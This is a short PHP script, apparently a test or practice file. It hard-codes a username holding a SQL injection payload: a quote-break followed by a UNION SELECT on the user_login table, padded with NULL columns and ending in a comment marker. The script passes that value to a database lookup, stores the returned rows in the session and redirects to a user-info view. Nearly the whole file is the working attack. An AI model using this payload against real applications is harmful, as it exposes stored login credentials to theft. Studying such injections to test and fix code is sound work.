<?php
  include "dbConnection.php";
  //session_destroy();
  session_start();
  $userName = 'franz'. "' UNION SELECT *, Null as Col4, NUll as Col5, Null as col6, Null as col7 FROM user_login -- ";
  $connector = new Connector();
  $userInfo = $connector->getUserInfo($userName);
  $_SESSION["userInfo"] = $userInfo;

  header("Location: Views/showUserInfoView.php");
  